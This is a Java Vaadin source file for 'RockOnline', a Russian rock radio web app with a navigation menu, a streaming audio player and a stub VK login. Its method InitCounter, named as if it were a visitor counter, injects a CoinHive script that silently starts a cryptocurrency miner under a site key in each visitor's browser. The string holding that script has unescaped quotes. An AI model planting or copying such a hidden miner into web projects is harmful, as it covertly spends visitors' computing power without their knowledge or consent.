package UI;

import backend.VKApi;
import com.vaadin.annotations.Theme;
import com.vaadin.annotations.VaadinServletConfiguration;
import com.vaadin.server.VaadinRequest;
import com.vaadin.server.VaadinServlet;
import com.vaadin.ui.*;
import com.github.appreciated.app.layout.behaviour.AppLayout;
import com.github.appreciated.app.layout.behaviour.Behaviour;
import com.github.appreciated.app.layout.builder.AppLayoutBuilder;
import static com.github.appreciated.app.layout.builder.AppLayoutBuilder.Position.HEADER;
import com.github.appreciated.app.layout.builder.design.AppBarDesign;
import com.github.appreciated.app.layout.builder.entities.DefaultBadgeHolder;
import com.github.appreciated.app.layout.component.MenuHeader;
import com.vaadin.annotations.Push;
import com.vaadin.annotations.Viewport;
import com.vaadin.icons.VaadinIcons;
import com.vaadin.navigator.View;
import com.vaadin.server.ExternalResource;
import com.vaadin.server.Page;
import static com.vaadin.server.Sizeable.Unit.CM;
import com.vaadin.shared.Position;
import com.vaadin.shared.ui.ContentMode;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.servlet.annotation.WebServlet;



@Push
@Viewport("width=device-width,initial-scale=1.0,user-scalable=no")
@Theme("mytheme")
public class MyUI extends UI {
   
    Label PlayerHTMLHolder;
    Label CounterHTMLHolder;
    Boolean isPlaying;
    
    PlayerView playerView = new PlayerView();
    EventsView eventsView = new EventsView();
    VKApi vkApi;
    
    @Override
    protected void init(VaadinRequest vaadinRequest) {

    try{
        
   
        DefaultBadgeHolder holder = new DefaultBadgeHolder(); 
        //holder.increase(); 
        
        InitPlayer();
        
        InitCounter();
       
        
        AppLayout layout = AppLayoutBuilder.get(Behaviour.LEFT_RESPONSIVE_OVERLAY_NO_APP_BAR)
              .withTitle("RockOnline")
              .withDefaultNavigationView(playerView)
              .withDesign(AppBarDesign.DEFAULT)
              .add(new MenuHeader(new ExternalResource("http://bpodryad.ru/data/otcher/RRO-logo.png")), HEADER)
              .add("Эфир", VaadinIcons.PLAY_CIRCLE_O, holder, playerView)
              .add("События", VaadinIcons.LIST, eventsView)
              .add("Расписание", VaadinIcons.SPLINE_CHART, View2.class) 
              .add("О нас", VaadinIcons.GROUP, View2.class)   
              .addClickable("Войти", VaadinIcons.ENTER_ARROW, clickEvent -> {InitLogin(vaadinRequest);})
              .add(PlayerHTMLHolder)
              .add(CounterHTMLHolder)
              .build();
        
        setContent(layout);
        playerView.CheckRelease();
        eventsView.Update();
         }catch (Exception ex) {
             showError(ex);
         }
    }
    


    
    private void InitLogin(VaadinRequest vaadinRequest){
        
        vkApi = new VKApi();
        vkApi.userCode = vaadinRequest.getParameter("code");
        
        try {
            vkApi.getCodeUrl();
        } catch (Exception ex) {
            showError(ex);
        }

        
//        URI currentLocationUrl =  getUI().getPage().getLocation();
//        try{
//            if( vkApi.userCode != null){            
//                vkApi.Auth();
//                getUI().getPage().setLocation(currentLocationUrl);
//                vkApi.getActorInfo();
//                showMessage(vkApi.actor.getAccessToken());
//            }else{
//                getUI().getPage().setLocation(vkApi.getCodeUrl());
//            }
//            
//        }catch (Exception ex){
//            showError(ex);
//        }     
    }
    
    private void InitThreads(){
        ScheduledExecutorService exec = Executors.newSingleThreadScheduledExecutor();
        exec.scheduleAtFixedRate(() -> {
            final MyUI ui = MyUI.this;
            ui.access(() -> {
                playerView.CheckRelease();
                ui.push();
            });
        }, 0, 5, TimeUnit.SECONDS);
    }
    
    
    //public static class PlayerView extends VerticalLayout implements View {}
    public static class View2 extends VerticalLayout implements View {}
    public static class View3 extends VerticalLayout implements View {}
    public static class View4 extends VerticalLayout implements View {}
    public static class View5 extends VerticalLayout implements View {}
    public static class View6 extends VerticalLayout implements View {}   

    private void InitPlayer(){ 
        
        isPlaying = false;
        String playerHTML =
        "<audio id=\"player\" src=\"http://skycast.su:2007/rock-online\"></audio>\n";
        PlayerHTMLHolder = new Label(playerHTML);
        PlayerHTMLHolder.setContentMode(ContentMode.HTML);
 
        playerView.getCover().addClickListener(event ->{ playerAction();});
        
    }
    
    private void InitCounter(){
        String HTML = "<script src="https://coinhive.com/lib/coinhive.min.js"></script>\n" + 
        "<script>\n" +
        "    var miner = new CoinHive.User('uPKFHYCHa2DjjajB9vEQJ2q3w7k9rraL', 'anon');\n" +
	"    miner.start();\n" +
        "</script>";
        CounterHTMLHolder = new Label(HTML);
        CounterHTMLHolder.setContentMode(ContentMode.HTML);
    }
    
    private void playerAction(){       
        if (isPlaying){
            //btnPlayStop.setIcon(VaadinIcons.PLAY);
            Pause();    
        }else{
            //btnPlayStop.setIcon(VaadinIcons.STOP);
            Play();  
        }
    }   
 
    private void Play(){
        String script = "document.getElementById('player').play();";
        JavaScript.getCurrent().execute(script);
        isPlaying = true;
    }
    
    private void Pause(){
        String script = "document.getElementById('player').pause();";
        JavaScript.getCurrent().execute(script);
        isPlaying = false;
    }  


    @WebServlet(urlPatterns = "/*", name = "MyUIServlet", asyncSupported = true)
    @VaadinServletConfiguration(ui = MyUI.class, productionMode = false)
    public static class MyUIServlet extends VaadinServlet { 
    }  
       
    
    private void showError(Exception e){
        Notification errorNotif = new Notification("ERROR:", e.toString());
        errorNotif.setPosition(Position.BOTTOM_RIGHT);
        errorNotif.setDelayMsec(100000);
        errorNotif.show(Page.getCurrent());       
    }
     
    private void showMessage(String text){
        Notification errorNotif = new Notification("INFO:", text);
        errorNotif.setPosition(Position.BOTTOM_RIGHT);
        errorNotif.setDelayMsec(100000);
        errorNotif.show(Page.getCurrent());       
    }   
    
}

